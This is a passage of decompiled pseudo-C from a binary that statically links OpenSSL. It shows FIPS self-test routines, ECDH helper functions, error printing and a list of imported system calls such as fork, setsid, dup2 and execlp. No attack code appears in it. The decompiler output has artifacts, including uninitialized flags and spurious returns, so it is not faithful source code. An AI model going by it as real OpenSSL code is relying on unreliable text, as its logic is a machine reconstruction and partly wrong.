        if ((int32_t)v46 == 37) {
            // 0x4c3750
            v47 = (int64_t)"OpenSSL FIPS 140-2 Public Key RSA KAT";
            v48 = memcmp((int64_t *)str2, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37) == 0;
        }
        // 0x4c3713
        CRYPTO_free(v24, v47);
        CRYPTO_free(str2, v47);
        // 0x4c371b
        v22 = v48 != 0;
        goto lab_0x4c33a3;
    }
}

// Address range: 0x4c3780 - 0x4c3860
int64_t FIPS_selftest_sha2(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int64_t v1 = __readfsqword(40); // 0x4c3785
    int64_t v2 = EVP_sha256(); // 0x4c3795
    int64_t v3; // bp-88, 0x4c3780
    EVP_Digest((int64_t)&g66, 9, &v3, 0, v2, 0);
    int64_t v4 = &v3; // 0x4c37c2
    bool v5; // 0x4c3780
    int64_t v6 = v5 ? -1 : 1;
    int64_t v7 = 32; // 0x4c37c5
    int64_t v8 = v4;
    int64_t v9 = (int64_t)&g67;
    int64_t v10; // 0x4c3780
    while (v7 != 0) {
        v7--;
        v10 = 126;
        if (*(char *)v9 != *(char *)v8) {
            goto lab_0x4c3826;
        }
        v8 += v6;
        v9 += v6;
    }
    int64_t v11 = EVP_sha512(v8, v9); // 0x4c37c9
    EVP_Digest((int64_t)&g68, 15, &v3, 0, v11, 0);
    int64_t v12 = v4; // 0x4c3780
    int64_t v13 = (int64_t)&g69; // 0x4c3780
    int64_t v14 = 64; // 0x4c37fe
    unsigned char v15 = *(char *)v13; // 0x4c37fe
    char v16 = *(char *)v12; // 0x4c37fe
    char v17 = v16; // 0x4c37fe
    bool v18 = false; // 0x4c37fe
    while (v15 == v16) {
        v14--;
        v12 += v6;
        v13 += v6;
        v17 = v15;
        v18 = true;
        if (v14 == 0) {
            // break ->
            break;
        }
        v15 = *(char *)v13;
        v16 = *(char *)v12;
        v17 = v16;
        v18 = false;
    }
    unsigned char v19 = v17;
    int64_t result = 1; // 0x4c3808
    v10 = 133;
    if ((v15 >= v19 && !v18) != v15 < v19) {
      lab_0x4c3826:
        // 0x4c3826
        ERR_put_error(45, 108, 101, "fips_sha_selftest.c", v10);
        result = 0;
    }
    // 0x4c380a
    if (v1 == __readfsqword(40)) {
        // 0x4c381a
        return result;
    }
    // 0x4c3850
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4c3860 - 0x4c3960
int64_t FIPS_selftest_sha1(void) {
    int64_t v1 = __readfsqword(40); // 0x4c3890
    bool v2; // 0x4c3860
    int64_t v3 = v2 ? -1 : 1;
    int64_t str = (int64_t)&g70; // 0x4c38aa
    int64_t v4 = (int64_t)&g72; // 0x4c38aa
    int64_t v5 = EVP_sha1(); // 0x4c38b0
    int32_t len = strlen((char *)str); // 0x4c38bb
    int64_t v6; // bp-88, 0x4c3860
    EVP_Digest(str, g293 + len, &v6, 0, v5, 0);
    int64_t v7 = &v6; // 0x4c38e7
    int64_t v8 = v4; // 0x4c38e7
    int64_t v9 = 20;
    int64_t v10; // 0x4c3860
    int64_t result; // 0x4c3860
    char v11; // 0x4c38e7
    while (v9 != 0) {
        v10 = v8;
        v11 = *(char *)v7;
        v7 += v3;
        v8 = v10 + v3;
        if (v11 != *(char *)v10) {
            // 0x4c3930
            ERR_put_error(45, 115, 101, "fips_sha_selftest.c", 94);
            result = 0;
            goto lab_0x4c38fd;
        }
        v9--;
    }
    // 0x4c38eb
    str += 60;
    v4 += 20;
    result = 1;
    while (str != (int64_t)&g71) {
        // 0x4c38b0
        v5 = EVP_sha1();
        len = strlen((char *)str);
        EVP_Digest(str, g293 + len, &v6, 0, v5, 0);
        v7 = &v6;
        v8 = v4;
        v9 = 20;
        while (v9 != 0) {
            v10 = v8;
            v11 = *(char *)v7;
            v7 += v3;
            v8 = v10 + v3;
            if (v11 != *(char *)v10) {
                // 0x4c3930
                ERR_put_error(45, 115, 101, "fips_sha_selftest.c", 94);
                result = 0;
                goto lab_0x4c38fd;
            }
            v9--;
        }
        // 0x4c38eb
        str += 60;
        v4 += 20;
        result = 1;
    }
    goto lab_0x4c38fd;
  lab_0x4c38fd:
    // 0x4c38fd
    if (v1 == __readfsqword(40)) {
        // 0x4c390d
        return result;
    }
    // 0x4c3955
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4c3970 - 0x4c3acb
int64_t FIPS_selftest_dsa(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    int64_t v1 = DSA_new(a1); // 0x4c3976
    if (v1 == 0) {
        // 0x4c3aaa
        return 0;
    }
    int64_t * v2 = (int64_t *)(v1 + 24); // 0x4c3989
    int64_t v3 = BN_bin2bn((int64_t)&g73, 256, (int32_t)*v2); // 0x4c3999
    *v2 = v3;
    if (v3 == 0) {
        // 0x4c3aa0
        DSA_free(v1);
        // 0x4c3aaa
        return 0;
    }
    int64_t * v4 = (int64_t *)(v1 + 32); // 0x4c39ab
    int64_t v5 = BN_bin2bn((int64_t)&g74, 28, (int32_t)*v4); // 0x4c39bb
    *v4 = v5;
    if (v5 == 0) {
        // 0x4c3aa0
        DSA_free(v1);
        // 0x4c3aaa
        return 0;
    }
    int64_t * v6 = (int64_t *)(v1 + 40); // 0x4c39cd
    int64_t v7 = BN_bin2bn((int64_t)&g75, 256, (int32_t)*v6); // 0x4c39dd
    *v6 = v7;
    if (v7 == 0) {
        // 0x4c3aa0
        DSA_free(v1);
        // 0x4c3aaa
        return 0;
    }
    int64_t * v8 = (int64_t *)(v1 + 48); // 0x4c39ef
    int64_t v9 = BN_bin2bn((int64_t)&g76, 256, (int32_t)*v8); // 0x4c39ff
    *v8 = v9;
    if (v9 == 0) {
        // 0x4c3aa0
        DSA_free(v1);
        // 0x4c3aaa
        return 0;
    }
    int64_t * v10 = (int64_t *)(v1 + 56); // 0x4c3a11
    int64_t v11 = *v10; // 0x4c3a11
    int64_t v12 = BN_bin2bn((int64_t)&g77, 28, (int32_t)v11); // 0x4c3a21
    *v10 = v12;
    if (v12 == 0) {
        // 0x4c3aa0
        DSA_free(v1);
        // 0x4c3aaa
        return 0;
    }
    int64_t v13 = 28; // 0x4c3a37
    int64_t v14 = &g77; // 0x4c3a37
    if (g294 != 0) {
        // 0x4c3ab8
        v14 = *v8;
        BN_set_bit(v14, 2047);
        v13 = 2047;
    }
    int64_t v15 = EVP_PKEY_new(v14, v13, v11); // 0x4c3a3d
    if (v15 == 0) {
        // 0x4c3aa0
        DSA_free(v1);
        // 0x4c3aaa
        return 0;
    }
    // 0x4c3a4a
    EVP_PKEY_assign(v15, 116, v1);
    int64_t v16 = fips_pkey_signature_test(v15, NULL, 0, 0, 0, (int32_t)EVP_sha256(), 0, (int64_t)"DSA SHA256"); // 0x4c3a81
    EVP_PKEY_free(v15);
    // 0x4c3aaa
    return (int32_t)v16 != 0;
}

// Address range: 0x4d4fa0 - 0x4d4fa8
int64_t EC_GFp_mont_method(void) {
    // 0x4d4fa0
    return &g162;
}

// Address range: 0x4d8ac0 - 0x4d8af9
int64_t ecdh_data_free(int64_t a1) {
    int64_t v1 = *(int64_t *)(a1 + 8); // 0x4d8ac4
    if (v1 != 0) {
        // 0x4d8acd
        ENGINE_finish(v1);
    }
    // 0x4d8ad2
    CRYPTO_free_ex_data(13, a1, a1 + 32);
    OPENSSL_cleanse(a1, 48);
    return CRYPTO_free(a1, 48);
}

// Address range: 0x4d8b00 - 0x4d8b29
int64_t ECDH_get_default_method(void) {
    int64_t result = g295; // 0x4d8b04
    if (result != 0) {
        // 0x4d8b10
        return result;
    }
    int64_t result2 = ECDH_OpenSSL(); // 0x4d8b18
    g295 = result2;
    return result2;
}

// Address range: 0x4d8b30 - 0x4d8c09
int64_t ECDH_DATA_new_method_clone_0(void) {
    // 0x4d8b30
    int64_t v1; // 0x4d8b30
    int64_t v2; // 0x4d8b30
    int64_t result = CRYPTO_malloc(48, "ech_lib.c", 135, v2, v1); // 0x4d8b42
    if (result == 0) {
        // 0x4d8bb0
        ERR_put_error(43, 101, 65, "ech_lib.c", 138);
        // 0x4d8b9d
        return 0;
    }
    // 0x4d8b4f
    *(int64_t *)result = 0;
    int64_t v3 = ECDH_get_default_method(); // 0x4d8b56
    int64_t * v4 = (int64_t *)(result + 8); // 0x4d8b5b
    *v4 = 0;
    int64_t * v5 = (int64_t *)(result + 24); // 0x4d8b63
    *v5 = v3;
    int64_t v6 = ENGINE_get_default_ECDH(); // 0x4d8b67
    *v4 = v6;
    int64_t v7; // 0x4d8b30
    if (v6 == 0) {
        // 0x4d8ba8
        v7 = *v5;
    } else {
        int64_t v8 = ENGINE_get_ECDH(v6); // 0x4d8b78
        *v5 = v8;
        v7 = v8;
        if (v8 == 0) {
            // 0x4d8bd3
            ERR_put_error(43, 101, 38, "ech_lib.c", 154);
            ENGINE_finish(*v4);
            CRYPTO_free(result, 101);
            // 0x4d8b9d
            return 0;
        }
    }
    // 0x4d8b86
    *(int32_t *)(result + 16) = *(int32_t *)(v7 + 16);
    CRYPTO_new_ex_data(13, result, result + 32);
    // 0x4d8b9d
    return result;
}

// Address range: 0x4d8c30 - 0x4d8d06
int64_t ecdh_check(int64_t a1) {
    int64_t v1 = EC_KEY_get_key_method_data(a1, 0x4d8c10, 0x4d8ac0, 0x4d8ac0); // 0x4d8c57
    int64_t result = v1; // 0x4d8c5f
    if (v1 == 0) {
        int64_t v2 = ECDH_DATA_new_method_clone_0(); // 0x4d8cc1
        if (v2 == 0) {
            // 0x4d8c73
            return 0;
        }
        int64_t v3 = EC_KEY_insert_key_method_data(a1, v2, 0x4d8c10, 0x4d8ac0, 0x4d8ac0); // 0x4d8ce5
        result = v2;
        if (v3 != 0) {
            // 0x4d8cf6
            ecdh_data_free(v2);
            result = v3;
        }
    }
    // 0x4d8c64
    if ((int32_t)FIPS_mode() == 0 || *(char *)(result + 16) % 2 != 0) {
        // 0x4d8c73
        return result;
    }
    int64_t result2 = result; // 0x4d8c9a
    if (EC_KEY_get_flags(a1) % 2 == 0) {
        // 0x4d8c9c
        ERR_put_error(43, 102, 103, "ech_lib.c", 234);
        result2 = 0;
    }
    // 0x4d8c73
    return result2;
}

// Address range: 0x4d8de0 - 0x4d8de8
int64_t ECDH_OpenSSL(void) {
    // 0x4d8de0
    return (int64_t)&g214;
}

// Address range: 0x4d9ab0 - 0x4d9ab5
int64_t ENGINE_get_ECDH(int64_t a1) {
    // 0x4d9ab0
    return *(int64_t *)(a1 + 40);
}

// Address range: 0x4d9ad0 - 0x4d9ae1
int64_t ENGINE_get_default_ECDH(void) {
    // 0x4d9ad0
    return engine_table_select(&g296, 1);
}

// Address range: 0x4d9c40 - 0x4d9d90
int64_t ERR_print_errors_cb(int64_t a1, int64_t a2) {
    int64_t v1 = __readfsqword(40); // 0x4d9c60
    int64_t v2; // bp-4472, 0x4d9c40
    int64_t v3 = &v2; // 0x4d9c73
    CRYPTO_THREADID_current(v3);
    int64_t v4 = CRYPTO_THREADID_hash(v3); // 0x4d9c9f
    int64_t v5; // bp-328, 0x4d9c40
    int64_t v6 = &v5;
    int64_t v7; // bp-4424, 0x4d9c40
    int64_t v8 = &v7;
    int32_t v9; // bp-4428, 0x4d9c40
    char v10; // bp-4432, 0x4d9c40
    int64_t v11; // bp-4440, 0x4d9c40
    int64_t v12; // bp-4448, 0x4d9c40
    int64_t v13 = ERR_get_error_line_data(&v11, (int64_t *)&v9, &v12, (int64_t *)&v10); // 0x4d9cb5
    while (v13 != 0) {
        // 0x4d9cc3
        ERR_error_string_n(v13, v6, 256);
        BIO_snprintf(v8, 0x1000, "%lu:%s:%s:%d:%s\n", v4, v6, v11);
        int64_t v14 = v8; // 0x4d9d15
        int32_t v15 = *(int32_t *)v14; // 0x4d9d18
        uint32_t v16 = v15 - 0x1010101 & (v15 ^ -0x7f7f7f80); // 0x4d9d26
        v14 += 4;
        while ((v16 & -0x7f7f7f80) == 0) {
            // 0x4d9d18
            v15 = *(int32_t *)v14;
            v16 = v15 - 0x1010101 & (v15 ^ -0x7f7f7f80);
            v14 += 4;
        }
        int32_t v17 = ((v16 & 0x8080) == 0 ? v16 / 0x10000 : v16) & -0x7f7f8000;
        if (v17 >= 0 != v17 != 0) {
            // break -> 0x4d9d64
            break;
        }
        v13 = ERR_get_error_line_data(&v11, (int64_t *)&v9, &v12, (int64_t *)&v10);
    }
    int64_t result = __readfsqword(40) ^ v1; // 0x4d9d6c
    if (result == 0) {
        // 0x4d9d77
        return result;
    }
    // 0x4d9d89
    __stack_chk_fail();
    return &g299;
}

// --------------- Statically Linked Functions ----------------

// int64_t stat(int64_t a1, int64_t a2);

// --------------- Dynamically Linked Functions ---------------

// const unsigned short int ** __ctype_b_loc(void);
// int64_t __cxa_begin_catch(void);
// int64_t __cxa_end_catch(void);
// int64_t __cxa_rethrow(void);
// int * __errno_location(void);
// int __fprintf_chk(FILE * restrict stream, int flag, const char * restrict format, ...);
// _IO_ssize_t __getdelim(char ** restrict lineptr, size_t * restrict n, int delimiter, FILE * restrict stream);
// void * __memcpy_chk(void * dest, const void * src, size_t len, size_t dstlen);
// char * secure_getenv(const char * name);
// void __stack_chk_fail(void);
// int __xstat(int ver, const char * filename, struct stat * stat_buf);
// void _ZdlPv(void * ptr);
// int64_t _ZNKSs5c_strEv(void);
// int64_t _ZNKSs6lengthEv(void);
// int64_t _ZNSaIcEC1Ev(void);
// int64_t _ZNSaIcED1Ev(void);
// int64_t _ZNSs6appendEPKc(char * a1);
// int64_t _ZNSs6appendERKSs(int64_t * a1);
// int64_t _ZNSsaSERKSs(int64_t * a1);
// int64_t _ZNSsC1EPKcRKSaIcE(char * a1, int64_t * a2);
// int64_t _ZNSsC1ERKSs(int64_t * a1);
// int64_t _ZNSsC1Ev(void);
// int64_t _ZNSsD1Ev(void);
// int64_t _ZNSsixEm(int64_t a1);
// int64_t _ZNSspLEPKc(char * a1);
// int64_t _Znwm(int64_t a1);
// int64_t _ZSt17__throw_bad_allocv(void);
// int64_t _ZSt20__throw_length_errorPKc(char * a1);
// void abort(void);
// int access(const char * name, int type);
// int atoi(const char * nptr);
// int chdir(const char * path);
// int close(int fd);
// int closedir(DIR * dirp);
// int dladdr(const void * address, Dlinfo * __info);
// int dlclose(void * handle);
// void * dlopen(const char * file, int mode);
// void * dlsym(void * restrict handle, const char * restrict name);
// int dup(int fd);
// int dup2(int fd, int fd2);
// int execlp(const char * file, const char * arg, ...);
// void exit(int status);
// int fclose(FILE * stream);
// int fflush(FILE * stream);
// char * fgets(char * restrict s, int n, FILE * restrict stream);
// FILE * fopen(const char * restrict filename, const char * restrict modes);
// __pid_t fork(void);
// int fprintf(FILE * restrict stream, const char * restrict format, ...);
// size_t fread(void * restrict ptr, size_t size, size_t n, FILE * restrict stream);
// void free(void * ptr);
// _IO_ssize_t getline(char ** restrict lineptr, size_t * restrict n, FILE * restrict stream);
// __pid_t getpid(void);
// int gettimeofday(struct timeval * restrict tv, __timezone_ptr_t tz);
// void * malloc(size_t size);
// int memcmp(const void * s1, const void * s2, size_t n);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// void * memmove(void * dest, const void * src, size_t n);
// void * memset(void * s, int c, size_t n);
// int open(const char * file, int oflag, ...);
// DIR * opendir(const char * name);
// int printf(const char * restrict format, ...);
// int puts(const char * s);
// void qsort(void * base, size_t nmemb, size_t size, __compar_fn_t compar);
// ssize_t read(int fd, void * buf, size_t nbytes);
// struct dirent * readdir(DIR * dirp);
// void * realloc(void * ptr, size_t size);
// __pid_t setsid(void);
// int sprintf(char * restrict s, const char * restrict format, ...);
// char * stpcpy(char * restrict dest, const char * restrict src);
// int strcasecmp(const char * s1, const char * s2);
// char * strchr(char * s, int c);
// int64_t strcmp(void);
// size_t strlen(const char * s);
// int strncasecmp(const char * s1, const char * s2, size_t n);
// int strncmp(const char * s1, const char * s2, size_t n);
// char * strncpy(char * restrict dest, const char * restrict src, size_t n);
// char * strrchr(char * s, int c);
// char * strstr(char * haystack, const char * needle);
// long int strtol(const char * restrict nptr, char ** restrict endptr, int base);
// __mode_t umask(__mode_t mask);
// __pid_t wait(__WAIT_STATUS stat_loc);
// ssize_t write(int fd, const void * buf, size_t n);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (4.4.7)
// Detected language: C++
// Detected functions: 495
